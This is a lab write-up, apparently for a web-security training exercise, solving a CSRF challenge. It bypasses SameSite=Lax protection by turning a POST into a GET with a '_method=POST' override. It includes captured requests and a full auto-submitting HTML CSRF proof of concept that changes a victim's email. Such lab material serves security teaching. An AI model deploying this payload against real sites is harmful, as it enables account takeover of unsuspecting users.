This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

Note :

## Solve

First login with your account and change your email once.

Capture the request with Burp Suite :

```http
POST /my-account/change-email HTTP/2
Host: 0a5d00fd04a55e698003264100e6001f.web-security-academy.net
Cookie: session=NWbhGkknNwiwxF4aYWhslrunX45xW28u
Content-Type: application/x-www-form-urlencoded

email=toto%40mail.com
```

The request contains no CSRF token.

The application relies only on the session cookie.

Check the response from the login request and observe that the session cookie is set without an explicit `SameSite` attribute.

Because of this, browsers apply the default policy :

```http
SameSite=Lax
```

With `Lax`, cookies are still sent during cross-site top-level GET navigations.

Send the request to Repeater.

Right-click and use :

```text
Change request method
```

Burp converts the request into :

```http
GET /my-account/change-email?email=toto%40mail.com HTTP/2
```

Send the request.

The server rejects it because the endpoint only accepts `POST`.

Now add the following parameter :

```http
&_method=POST
```

Final request :

```http
GET /my-account/change-email?email=toto%40mail.com&_method=POST HTTP/2
Host: 0a5d00fd04a55e698003264100e6001f.web-security-academy.net
```

The backend uses method override and interprets the request as a POST request.

The email change is accepted.

Generate a CSRF PoC using Burp Suite :

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a5d00fd04a55e698003264100e6001f.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="hacker&#64;labs&#46;com" />
      <input type="hidden" name="&#95;method" value="POST" />
      <input type="submit" value="Submit request" />
    </form>

    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>

  </body>
</html>
```

The exploit works because :

- the request is sent as a top-level navigation
- the browser includes the session cookie due to `SameSite=Lax`
- `_method=POST` bypasses the HTTP method restriction

Store the payload on the **Exploit Server** and deliver it to the victim.
